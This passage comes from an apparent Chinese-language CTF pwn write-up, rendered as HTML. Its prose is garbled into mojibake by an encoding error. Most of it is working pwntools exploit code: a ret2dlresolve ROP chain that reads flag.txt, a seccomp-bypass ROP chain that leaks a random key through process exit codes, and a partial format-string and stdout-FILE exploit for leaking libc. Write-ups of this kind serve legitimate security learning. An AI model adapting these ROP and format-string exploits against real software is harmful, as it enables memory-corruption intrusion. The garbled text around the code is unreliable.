fakeSymAddr <span class="token operator">=</span> fakeStrAddr <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fakeStr<span class="token punctuation">)</span>
fakeSym <span class="token operator">=</span> <span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fakeStrAddr <span class="token operator">-</span> dynstr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x12"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token comment"># + b"p"*16</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>fakeSymAddr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>fakeSymAddr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span>
symOffset <span class="token operator">=</span> <span class="token punctuation">(</span>fakeSymAddr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x18</span>

fakeRelaAddr <span class="token operator">=</span> fakeSymAddr <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fakeSym<span class="token punctuation">)</span>
fakeRela <span class="token operator">=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'seccomp_init'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>symOffset <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>fakeRelaAddr <span class="token operator">-</span> rel<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>fakeRelaAddr <span class="token operator">-</span> rel<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span>

dlresolve <span class="token operator">=</span> fakeStr <span class="token operator">+</span> fakeSym <span class="token operator">+</span>  fakeRela
baseStage <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xc00</span> <span class="token comment"># this for the second stack pvioting, or the read data will destory the return frame</span>
control <span class="token operator">=</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401020</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>fakeRelaAddr <span class="token operator">-</span> rel<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> \
        csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> baseStage<span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>leave<span class="token punctuation">.</span>address<span class="token punctuation">,</span> baseStage <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span>
control <span class="token operator">=</span> control<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> control <span class="token operator">+</span> dlresolve

pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># read = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span>
read <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
base <span class="token operator">=</span> read <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"read : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"base : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment"># open and sendfile</span>
<span class="token comment"># 0xdfece : pop rcx ; pop rbx ; ret # notice this is in the local libc which version is 2.39</span>
<span class="token comment"># 0x10257e : pop rcx ; pop rbx ; ret</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>baseStage <span class="token operator">+</span> <span class="token number">136</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> lrop<span class="token punctuation">.</span>rsi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span>\
        p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> lrop<span class="token punctuation">.</span>rsi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> lrop<span class="token punctuation">.</span>rdx<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>\
        p64<span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token number">0x10257e</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'sendfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'exit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"flag.txt\x00"</span>
<span class="token comment"># the lrop.rdx.address is point to : 0x119431 which is pop rdx ; pop r12 ; ret. my bad :( , i think it will only the pop rdx, ret.</span>

pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<h5 id="pwn-iloveseccomp"><a href="#pwn-iloveseccomp" class="headerlink" title="pwn&#x2F;iloveseccomp"></a>pwn&#x2F;iloveseccomp</h5><p>è¿™é¢˜ç”¨äº†ä¸€ä¸ªpythonè„šæœ¬æ¥äº¤äº’ã€‚é€»è¾‘æ˜¯å…ˆä¼šç”Ÿäº§ä¸€ä¸ªkeyæ–‡ä»¶ï¼Œé‡Œé¢å­˜8ä¸ªéšæœºå­—èŠ‚ã€‚ç„¶åå¯åŠ¨ç¨‹åº8æ¬¡ï¼Œè€Œä¸”ä¼šæ‰“å°å‡ºç¨‹åºé€€å‡ºçš„çŠ¶æ€ç ï¼Œè¿è¡Œå®Œ8æ¬¡ä¹‹åé—®ä½ keyæ–‡ä»¶å†…å®¹æ˜¯ä»€ä¹ˆã€‚çœ‹èµ·æ¥æ˜¯è¦é€šè¿‡mainç¨‹åºæ³„éœ²æ•°æ®ã€‚ </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> os <span class="token keyword">import</span> urandom
<span class="token keyword">import</span> pwn
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

<span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  key <span class="token operator">=</span> urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"key.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
  <span class="token keyword">return</span> key

<span class="token keyword">def</span> <span class="token function">prog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  r <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"./main"</span><span class="token punctuation">)</span>
  sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvS<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token keyword">try</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"my guy"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
  r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
  sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Process exited with code </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">.</span>poll<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
  userKey <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Okay... WHAT IS THE KEY (in hex) "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">if</span> userKey <span class="token operator">==</span> key<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Lucky guess..."</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"nope"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"***The program will run eight times***\n"</span><span class="token punctuation">)</span>
  key <span class="token operator">=</span> init<span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    prog<span class="token punctuation">(</span><span class="token punctuation">)</span>
  check<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>æŸ¥çœ‹ä¿æŠ¤</p>
<p><img src="https://s2.loli.net/2024/08/19/KkzQaVjOClyDugU.png" alt="d4abdb282f4542628b59de4825e9b0ba.png"></p>
<p>é¦–å…ˆè¯»äº†8ä¸ªå­—èŠ‚çš„éšæœºæ•°æ®ï¼Œ ç„¶åå°†è¿™ä¸ªå€¼&amp;0xFFFFFFFF000LLï¼Œå¹¶å°†å…¶å­˜å…¥randAddrè¿™ä¸ªå˜é‡é‡Œï¼Œè¿™ä¸ªå˜é‡åœ¨bssæ®µã€‚ç„¶åç”¨è¿™ä¸ªå€¼ä½œä¸ºæ®µåŸºå€ï¼Œmmapè¿™ä¸ªkeyæ–‡ä»¶åˆ°å†…å­˜ï¼Œä¹Ÿå°±æ˜¯randAddræŒ‡å‘çš„åœ°å€é‡Œå­˜æ”¾ç€keyçš„å†…å®¹ã€‚ç„¶åå­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œå¹¶å¼€å¯seccompã€‚ </p>
<p><img src="https://s2.loli.net/2024/08/19/QS8gBHfod31eZrs.png" alt="3c4b4109abda4d7d90366e2b5ff4f378.png"></p>
<p>æŸ¥çœ‹seccompé‡Œé¢çš„å†…å®¹ï¼Œåªå…è®¸æ‰§è¡Œext</p>
<p><img src="https://s2.loli.net/2024/08/19/sGHaFmMgEtYQ7qo.png" alt="a0952d33b8254aa6a5f23b03d07772b5.png"></p>
<p>exitçš„çŠ¶æ€ç å…¶å®æ˜¯è‡ªå·±å¡«çš„ï¼ˆçŠ¶æ€ç è¿”å›åœ¨rdiå¯„å­˜å™¨é‡Œé¢ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥æ³„éœ²ï¼Œä½†æ˜¯exitåªèƒ½æ³„éœ²å‡ºæœ€ä½å­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€å…±æœ‰8å­—èŠ‚éœ€è¦æ³„éœ²å°±éœ€è¦8æ¬¡ï¼Œåˆšå¥½ä¸é¢˜ç›®å¯¹åº”ä¸Šäº†ã€‚ç”±äºseccompçš„å­˜åœ¨ï¼Œæ²¡æ³•æ³„éœ²æ•°æ®ï¼Œæ‰€ä»¥åªèƒ½ä»ä¸€è·¯æ‰“gadgetæ²¡æ³•æ‰“syscallï¼ˆexitè°ƒç”¨é™¤å¤–ï¼‰æˆ–è€…å…¶ä»–çš„orwä¸€ç±»éœ€è¦ç”¨åˆ°readï¼Œwriteï¼Œopenç­‰ç³»ç»Ÿè°ƒç”¨çš„é“¾ã€‚å¥½å°±å¥½åœ¨è¿™ï¼Œå¯ä»¥é”»ç‚¼æ‰‹åŠ¨å†™rop chainçš„èƒ½åŠ›ã€‚</p>
<p>ä¸ºäº†æ³„éœ²æ•°æ®ï¼Œæˆ‘ä»¬è¦èƒ½çŸ¥é“ç¨‹åºçš„pieï¼Œlibcä»–å·²ç»ç»™äº†æ‰€ä»¥æˆ‘ä»¬æ˜¯çŸ¥é“libcçš„åŸºå€ã€‚é‚£ä¹ˆlibcä¸­çš„gadgetéƒ½å¯ä»¥ç”¨ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/QcqNGspAhiu3xOy.png" alt="7cde6409e61247968a5abf1126d4a4c7.png"></p>
<p>å¯„å­˜å™¨ä¸­å…¶å®ä¿ç•™äº†éƒ¨åˆ†ç¨‹åºçš„ä¿¡æ¯ï¼Œä¾‹å¦‚rbxä¸­å­˜åœ¨äº†__libc_csu_initçš„åœ°å€ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°pieçš„åŸºå€ï¼Œç„¶åå†åŠ ä¸ŠrandAddrçš„åç§»ï¼Œå¯¹å…¶è§£å¼•ç”¨å°±å¯ä»¥å¾—åˆ°randAddrçš„å…·ä½“å€¼ï¼Œä¹Ÿå°±å¯ä»¥å¾—åˆ°keyçš„å†…å®¹ï¼Œæœ€åå°†å…¶è½¬ç§»åˆ°rdiå†è°ƒç”¨syscallè¿›è¡Œæ³„éœ²å³å¯ã€‚ç¬¬ä¸€æ¬¡å†™è¿™ç§é¢˜ç›®ï¼Œä¸‹æ¬¡åšé¢˜é‡åˆ°è¿™ç§æ²¡è§è¿‡çš„é¢˜ç›®ä¸€å®šè¦æœ‰è€å¿ƒï¼ï¼</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    
  key <span class="token operator">=</span> <span class="token string">b""</span>

  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">"Sympathy leak:"</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">0x110cc0</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    
    MOV_RAX_RBX <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000008d883</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>
    SUB_RAX_RDI <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000000b1d58</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    ADD_RAX_RDI <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000000a8978</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    POP_RDI <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000023b6a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    DEREF_RAX <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000001411fc</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span> 
    XCHG_EDI_EAX <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000000f1b65</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>

    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x38</span> <span class="token operator">+</span> MOV_RAX_RBX <span class="token operator">+</span> POP_RDI <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">11256</span><span class="token punctuation">)</span> <span class="token operator">+</span> SUB_RAX_RDI
    pl <span class="token operator">+=</span> DEREF_RAX <span class="token operator">+</span> POP_RDI <span class="token operator">+</span> p64<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> ADD_RAX_RDI <span class="token operator">+</span> DEREF_RAX <span class="token operator">+</span> XCHG_EDI_EAX <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>exit<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Process exited with code "</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    key <span class="token operator">+=</span> n<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'litte'</span><span class="token punctuation">)</span>
  
  lg<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span>
  sl<span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<h5 id="pwn-How-to-Raise-a-Boring-Vuln-Flat"><a href="#pwn-How-to-Raise-a-Boring-Vuln-Flat" class="headerlink" title="pwn&#x2F;How to Raise a Boring Vuln Flat"></a>pwn&#x2F;How to Raise a Boring Vuln Flat</h5><p>æœ‰ç‚¹å˜å½¢çš„é‚£ç§house of romanï¼Œæ²¡æ€ä¹ˆåšè¿‡å…ˆç•™ç€å§ã€‚ä»¥åç­‰å˜å¼ºäº†å†æ¥çœ‹çœ‹ã€‚ </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    sl<span class="token punctuation">(</span><span class="token string">b"5"</span><span class="token punctuation">)</span>

    pl <span class="token operator">=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"%157"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$s\0\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$s\0\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"%186"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$10c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    <span class="token comment"># pause()</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    sl<span class="token punctuation">(</span><span class="token string">b"-7"</span><span class="token punctuation">)</span>
    stdout <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token string">b"\x20\x01"</span>

    sl<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">b"\xe0"</span><span class="token punctuation">)</span>
    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">b"\xe0"</span><span class="token operator">+</span>r<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>_IO_2_1_stdin_
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>

    sl<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>
    
    pl <span class="token operator">=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"%158"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$s\0\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    <span class="token comment"># pause()</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b"-7"</span><span class="token punctuation">)</span>

    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
